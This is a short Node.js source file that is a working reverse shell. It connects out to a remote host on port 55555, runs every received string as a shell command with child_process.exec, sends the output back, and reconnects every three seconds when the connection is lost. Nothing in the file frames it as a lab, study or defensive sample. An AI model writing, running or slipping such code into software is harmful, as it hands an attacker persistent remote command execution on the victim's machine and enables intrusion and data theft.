const net = require('net');
const shell = require('child_process').exec;

const REMOTE_HOST = ''; 
const REMOTE_PORT = 55555;

function connectBack() {
    const client = new net.Socket();

    client.connect(REMOTE_PORT, REMOTE_HOST, () => {
        client.write('connected!\n');
    });

    
    client.on('data', (data) => {
        console.log(`command redeived: ${data}`);
        shell(data.toString().trim(), (error, stdout, stderr) => {
            if (error) {
                client.write(`Error: ${error.message}\n`);
                return;
            }
            if (stderr) {
                client.write(`Stderr: ${stderr}\n`);
                return;
            }
            client.write(`Result: ${stdout}\n`);
        });
    });

   
    client.on('close', () => {
        console.log('lost, trying to reconnecting...');
        setTimeout(connectBack, 3000); 
    });

    client.on('error', (err) => {
        console.error(`Erro de conexão: ${err.message}`);
    });
}

connectBack();
